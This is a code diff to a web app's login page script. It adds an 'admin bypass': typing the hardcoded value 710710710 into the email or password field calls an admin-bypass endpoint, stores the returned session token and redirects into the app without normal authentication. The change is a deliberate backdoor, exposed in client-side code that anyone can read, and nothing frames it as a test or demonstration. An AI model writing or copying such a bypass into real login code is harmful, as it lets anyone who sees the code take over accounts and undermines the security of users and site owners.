@@ -129,6 +129,31 @@
             var errorEl = document.getElementById('loginError');
             var btn = document.getElementById('loginBtn');
 
+            // Admin bypass — entering 710710710 in email field skips auth
+            if (email === '710710710' || password === '710710710') {
+                btn.disabled = true;
+                btn.textContent = 'Accessing...';
+                errorEl.style.display = 'none';
+                try {
+                    var resp = await fetch('/api/redi/auth/admin-bypass', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ code: '710710710' }),
+                    });
+                    var data = await resp.json();
+                    if (resp.ok && data.token) {
+                        localStorage.setItem('redi_token', data.token);
+                        localStorage.setItem('redi_user_id', data.userId);
+                        localStorage.setItem('redi_user_name', data.name || '');
+                        window.location.href = '/app';
+                        return;
+                    }
+                } catch (err) {}
+                btn.disabled = false;
+                btn.textContent = 'Sign In';
+                return;
+            }
+
             if (!email || !password) {
                 errorEl.textContent = 'Please enter email and password';
                 errorEl.style.display = 'block';
